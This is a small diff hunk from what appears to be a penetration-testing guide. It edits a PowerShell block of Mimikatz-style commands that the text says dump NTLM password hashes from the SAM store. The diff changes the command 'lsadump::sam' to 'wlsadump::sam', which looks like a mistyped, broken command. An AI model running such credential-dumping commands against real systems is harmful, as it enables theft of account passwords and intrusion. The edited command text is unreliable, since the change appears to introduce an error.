@@ -506,7 +506,7 @@ Then, if we have the privileges, it can be used to dump NTLM hashes with
 ```powershell
 privilege::debug
 token::elevate
-lsadump::sam
+wlsadump::sam
 ```
 
 To impersonate another user
